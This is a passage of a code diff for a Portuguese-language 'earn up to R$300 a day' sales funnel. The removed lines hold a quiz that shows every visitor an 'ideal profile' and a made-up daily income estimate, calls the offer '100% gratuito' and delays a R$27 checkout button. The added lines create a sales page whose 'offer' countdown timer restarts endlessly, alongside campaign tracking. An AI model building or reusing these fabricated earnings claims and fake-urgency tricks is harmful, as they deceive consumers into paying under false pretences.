-      +         '<div class="cmc-item-left">'
-      +           '<div class="cmc-item-icon" style="background:#FEE2E2;"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#DC2626" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><circle cx="12" cy="12" r="6"></circle><circle cx="12" cy="12" r="2"></circle></svg></div>'
-      +           '<span class="cmc-item-label">Perfil confirmado</span>'
-      +         '</div>'
-      +         '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#16A34A" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>'
-      +       '</div>'
-      +     '</div>'
-
-      +     '<div class="cmc-divider"></div>'
-
-      +     '<div class="cmc-estimate-box">'
-      +       '<div class="cmc-est-left">'
-      +         '<div class="piggy-icon">🐷</div>'
-      +         '<div class="cmc-est-texts">'
-      +           '<span class="cmc-est-label">Sua estimativa diária</span>'
-      +           '<div class="cmc-est-num">R$' + totalVal + ' <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#16A34A" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 6 13.5 15.5 8.5 10.5 1 18"></polyline><polyline points="17 6 23 6 23 12"></polyline></svg></div>'
-      +         '</div>'
-      +       '</div>'
-      +       '<div class="cmc-est-badge">'
-      +         '<div class="cmc-eb-text">Ótimo<br>perfil</div>'
-      +         '<div class="cmc-eb-star">★</div>'
-      +       '</div>'
-      +     '</div>'
-      +   '</div>'
-
-      +   '<div class="confirm-trust-card">'
-      +     '<div class="ctc-col">'
-      +       '<div class="ctc-icon">'
-      +         '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#16A34A" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>'
-      +       '</div>'
-      +       '<div>'
-      +         '<div class="ctc-title">Seus dados estão seguros 🔒</div>'
-      +         '<div class="ctc-sub">Utilizamos tecnologia segura para proteger suas informações.</div>'
-      +       '</div>'
-      +     '</div>'
-      +     '<div class="ctc-col">'
-      +       '<div class="ctc-icon">'
-      +         '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#16A34A" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M23 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>'
-      +       '</div>'
-      +       '<div>'
-      +         '<div class="ctc-title">100% gratuito</div>'
-      +         '<div class="ctc-sub">Sem taxas, sem pegadinhas e sem compromisso.</div>'
-      +       '</div>'
-      +     '</div>'
-      +   '</div>'
-      + '</div>';
-  }
-
-  function renderLoading(){
-    return '<div class="loading-wrap">'
-      + '<div class="ring" aria-hidden="true"></div>'
-      + '<p class="loading-title">Calculando sua estimativa...</p>'
-      + '<p class="loading-sub">Só um instante</p>'
-      + '</div>';
-  }
-
-  function renderResult(){
-    var taskObj = answers.q1 ? findOption('q1', answers.q1) : { label: 'Lavar louça', emoji: '🧼' };
-    var taskLabel = taskObj ? taskObj.label : 'Lavar louça';
-    var taskVal = (answers.q1 && TASK_VALUES[answers.q1]) ? TASK_VALUES[answers.q1] : 60;
-    var timeVal = (answers.q3 && TIME_VALUES[answers.q3]) ? TIME_VALUES[answers.q3] : 40;
-    var totalVal = taskVal + timeVal;
-
-    return ''
-      + '<div class="result-hero-wrap">'
-      + '  <div class="result-hero-text">'
-      + '    <div class="result-eyebrow"><span style="font-size:14px;">🏆</span> Seu resultado</div>'
-      + '    <h1 class="result-title">Você tem o <span class="result-highlight">perfil ideal!</span> 🎉</h1>'
-      + '    <p class="result-sub">Baseado no que você já faz — <strong class="rs-task">' + taskLabel.toLowerCase() + '</strong> — e no seu tempo disponível, veja sua estimativa:</p>'
-      + '  </div>'
-      + '</div>'
-
-      + '<div class="result-receipt-card">'
-      + '  <div class="rc-header">Receba até essa renda realizando:</div>'
-      
-      + '  <div class="rc-row">'
-      + '    <div class="rc-left">'
-      + '      <div class="rc-icon-bg green-soft">'
-      + '        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#16A34A" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2v6"/><path d="M12 18v4"/><path d="M4.93 4.93l4.24 4.24"/><path d="M14.83 14.83l4.24 4.24"/><path d="M14.83 9.17l4.24-4.24"/><path d="M4.93 19.07l4.24-4.24"/></svg>'
-      + '      </div>'
-      + '      <span class="rc-label">' + taskLabel + '</span>'
-      + '    </div>'
-      + '    <div class="rc-val green">R$' + taskVal + '</div>'
-      + '  </div>'
-
-      + '  <div class="rc-row">'
-      + '    <div class="rc-left">'
-      + '      <div class="rc-icon-bg green-soft">'
-      + '        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#16A34A" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>'
-      + '      </div>'
-      + '      <span class="rc-label">Tempo disponível</span>'
-      + '    </div>'
-      + '    <div class="rc-val green">R$' + timeVal + '</div>'
-      + '  </div>'
-
-      + '  <div class="rc-row">'
-      + '    <div class="rc-left">'
-      + '      <div class="rc-icon-bg green-filled">'
-      + '        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#FFFFFF" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>'
-      + '      </div>'
-      + '      <span class="rc-label">Perfil elegível</span>'
-      + '    </div>'
-      + '    <div class="rc-check">'
-      + '      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#16A34A" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>'
-      + '    </div>'
-      + '  </div>'
-
-      + '  <div class="rc-row">'
-      + '    <div class="rc-left">'
-      + '      <div class="rc-icon-bg red-soft">'
-      + '        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#DC2626" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/></svg>'
-      + '      </div>'
-      + '      <span class="rc-label">Perfil confirmado</span>'
-      + '    </div>'
-      + '    <div class="rc-check">'
-      + '      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#16A34A" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>'
-      + '    </div>'
-      + '  </div>'
-
-      + '  <div class="rc-divider"></div>'
-
-      + '  <div class="rc-total-row">'
-      + '    <span class="rc-total-label">Estimativa / dia</span>'
-      + '    <div class="rc-total-val-wrap">'
-      + '      <span class="rc-total-val" id="totalNum" data-target="' + totalVal + '">R$0</span>'
-      + '      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#16A34A" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 6 13.5 15.5 8.5 10.5 1 18"/><polyline points="17 6 23 6 23 12"/></svg>'
-      + '    </div>'
-      + '  </div>'
-      + '</div>'
-
-      + '<div class="result-step-banner">'
-      + '  <div class="rsb-thumb">'
-      + '    <svg width="18" height="18" viewBox="0 0 24 24" fill="#FFFFFF"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>'
-      + '  </div>'
-      + '  <div class="rsb-content">'
-      + '    <div class="rsb-title">Falta só 1 passo</div>'
-      + '    <div class="rsb-sub">Veja como você pode receber sua primeira Pix hoje 💸</div>'
-      + '  </div>'
-      + '</div>'
-
-      + '<div class="result-cta-wrap">'
-      + '  <div class="cta-arrow-indicator">'
-      + '    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#E8A33D" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4c0 8 4 12 12 12M12 12l4 4-4 4"/></svg>'
-      + '  </div>'
-      + '  <button class="btn-primary btn-result-cta" data-action="show-video">'
-      + '    Ver como receber agora <span style="margin-left:4px;">→</span>'
-      + '  </button>'
-      + '</div>';
-  }
-
-  function renderVideo(){
-    return ''
-      + '<h2 style="margin-bottom:18px; font-size:24px; font-weight:800; line-height:1.3; text-align:center; color:#111827;">Assista até o <span style="color:#16A34A;">final</span>, eu vou te mostrar <span style="color:#16A34A;">como funciona</span> 👇</h2>'
-      + '<!-- Player Vturb -->'
-      + '<iframe src="https://scripts.converteai.net/00987fc7-eae6-48fd-92b9-b866f2f62103/players/6a7911edbda06d1b04c88055/embed.html" id="ig-vid_6a7911edbda06d1b04c88055" allowfullscreen="true" allow="autoplay; fullscreen; picture-in-picture; encrypted-media; gyroscope; accelerometer; clipboard-write; web-share" style="width: 100%; aspect-ratio: 9/16; border-radius: var(--radius-md); overflow: hidden; border: none; margin: 16px 0 18px;"></iframe>'
-      + '<!-- 🔗 Troque o href abaixo pelo link real -->'
-      + '<a class="btn-cta-green" href="https://pay.lowify.com.br/checkout?product_id=b9pSRV" data-action="cta" id="cta-button" style="display: none;">'
-      + '  <span style="font-size:20px; font-weight:800; letter-spacing: -0.3px;">QUERO COMEÇAR AGORA →</span>'
-      + '  <span style="font-size:13px; font-weight:700; opacity:0.95; background:rgba(0,0,0,0.18); padding:3px 14px; border-radius:99px;">Por apenas R$ 27 (Acesso Imediato)</span>'
-      + '</a>'
-      + '<img id="cta-image" src="./ganhe-ate-300-por-dia.webp" alt="Ganhe até 300 por dia" decoding="async" fetchpriority="high" style="display: none; width: 100%; max-width: 100%; margin-top: 14px; border-radius: 12px; object-fit: contain;" />';
-  }
-
-  function animateCount(){
-    var el = document.getElementById('totalNum');
-    if(!el) return;
-    var target = parseInt(el.getAttribute('data-target'), 10);
-    var reduced = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
-    if(reduced){ el.textContent = 'R$' + target; return; }
-
-    var duration = 700;
-    var startTime = null;
-    function tick(now){
-      if(startTime === null) startTime = now;
-      var p = Math.min((now - startTime) / duration, 1);
-      el.textContent = 'R$' + Math.floor(p * target);
-      if(p < 1) requestAnimationFrame(tick);
-      else el.textContent = 'R$' + target;
-    }
-    requestAnimationFrame(tick);
-  }
-
-  // 📊 Envia a etapa alcançada + UTMs da campanha pra sua planilha (Apps Script)
   function trackEvent(step){
     if(!TRACKING_ENDPOINT || TRACKING_ENDPOINT.indexOf('COLE_AQUI') > -1) return;
-
     var payload = {
       session_id: sessionId,
       step: step,
@@ -1275,95 +716,91 @@ body.is-landing .stage { position: relative; z-index: 1; }
       utm_content: utms.utm_content,
       utm_term: utms.utm_term
     };
-
     fetch(TRACKING_ENDPOINT, {
       method: 'POST',
       mode: 'no-cors',
       headers: { 'Content-Type': 'text/plain;charset=utf-8' },
       body: JSON.stringify(payload)
-    }).catch(function(){ /* falha de rede não deve travar o quiz */ });
+    }).catch(function(){});
   }
 
-  function stepEventName(step){
-    if(step.type === 'landing') return 'quiz_start';
-    if(step.type === 'question') return 'quiz_' + step.key;
-    if(step.type === 'confirm') return 'quiz_confirm';
-    if(step.type === 'result') return 'quiz_result_view';
-    if(step.type === 'video') return 'quiz_video_view';
-    return null;
+  trackEvent('sales_page_view');
+
+  // Dynamic Date
+  var dateEl = document.getElementById('current-date');
+  if(dateEl) {
+    var today = new Date();
+    var dd = String(today.getDate()).padStart(2, '0');
+    var mm = String(today.getMonth() + 1).padStart(2, '0');
+    dateEl.textContent = dd + '/' + mm;
   }
 
-  function render(){
-    var stage = document.getElementById('stage');
-    if (!stage) return;
-    var step = STEPS[current];
-    var html = '';
-
-    if(step.type === 'landing') html = renderLanding();
-    else if(step.type === 'question') html = renderQuestion(step);
-    else if(step.type === 'confirm') html = renderConfirm();
-    else if(step.type === 'loading') html = renderLoading();
-    else if(step.type === 'result') html = renderResult();
-    else if(step.type === 'video') html = renderVideo();
-
-    stage.innerHTML = html;
-    stage.classList.remove('anim');
-    void stage.offsetWidth;
-    stage.classList.add('anim');
-
-    renderTopbar();
-
-    document.body.classList.toggle('center-screen', step.type === 'video'); document.body.classList.toggle('is-landing', step.type === 'landing');
-
-    var evtName = stepEventName(step);
-    if(evtName) trackEvent(evtName);
-
-    if(step.type === 'loading'){
-      setTimeout(function(){ current++; render(); }, 1500);
+  // Timer countdown (14m 59s loop)
+  var timerEl = document.getElementById('countdown-timer');
+  if(timerEl) {
+    var duration = 14 * 60 + 59;
+    var savedTime = localStorage.getItem('offer_timer_end');
+    var now = Math.floor(Date.now() / 1000);
+    var endTime;
+    if (savedTime && parseInt(savedTime, 10) > now) {
+      endTime = parseInt(savedTime, 10);
+    } else {
+      endTime = now + duration;
+      localStorage.setItem('offer_timer_end', endTime);
     }
-    if(step.type === 'result'){
-      animateCount();
-    }
-    if(step.type === 'video'){
-      setTimeout(function(){
-        var cta = document.getElementById('cta-button');
-        if(cta) cta.style.display = 'flex';
-        var img = document.getElementById('cta-image');
-        if(img) img.style.display = 'block';
-      }, 75000);
-    }
-  }
-
-  var stageEl = document.getElementById('stage');
-  if (stageEl) {
-    stageEl.addEventListener('click', function(e){
-      var optBtn = e.target.closest('.option');
-    if(optBtn){
-      var step = STEPS[current];
-      answers[step.key] = optBtn.getAttribute('data-value');
-      current++;
-      render();
-      return;
-    }
-    var actionEl = e.target.closest('[data-action]');
-    if(actionEl){
-      var action = actionEl.getAttribute('data-action');
-      if(action === 'start' || action === 'confirm' || action === 'show-video'){
-        current++;
-        render();
+    
+    function updateTimer() {
+      var current = Math.floor(Date.now() / 1000);
+      var remaining = endTime - current;
+      if (remaining <= 0) {
+        remaining = duration;
+        endTime = current + duration;
+        localStorage.setItem('offer_timer_end', endTime);
       }
-      if(action === 'cta'){
-        trackEvent('quiz_cta_click');
-        // ⚠️ A conversão de compra (Purchase) você registra na página do CHECKOUT real (Hotmart, etc.), não aqui
-      }
-      // 'play-placeholder' é só visual — sem ação real até você trocar pelo player de verdade
+      var mins = Math.floor(remaining / 60);
+      var secs = remaining % 60;
+      timerEl.textContent = String(mins).padStart(2, '0') + ':' + String(secs).padStart(2, '0');
     }
+    updateTimer();
+    setInterval(updateTimer, 1000);
+  }
+
+  // FAQ Accordion Interactivity
+  var faqQuestions = document.querySelectorAll('.faq-question');
+  faqQuestions.forEach(function(q){
+    q.addEventListener('click', function(){
+      var item = q.parentElement;
+      var isActive = item.classList.contains('active');
+      document.querySelectorAll('.faq-item').forEach(function(i){ i.classList.remove('active'); });
+      if(!isActive){
+        item.classList.add('active');
+      }
+    });
   });
+
+  // Append UTM parameters automatically to checkout links
+  if (window.location.search) {
+    var checkoutLinks = document.querySelectorAll('a[href*="checkout"]');
+    var searchParams = window.location.search.substring(1);
+    checkoutLinks.forEach(function(link) {
+      var href = link.getAttribute('href');
+      if (href) {
+        var separator = href.indexOf('?') > -1 ? '&' : '?';
+        link.setAttribute('href', href + separator + searchParams);
+      }
+    });
   }
 
-  render();
+  // Track CTA Clicks
+  var ctaBtns = document.querySelectorAll('.landing-cta-btn');
+  ctaBtns.forEach(function(btn){
+    btn.addEventListener('click', function(){
+      trackEvent('sales_cta_click');
+    });
+  });
 
 })();
 </script>
+
 </body>
 </html>
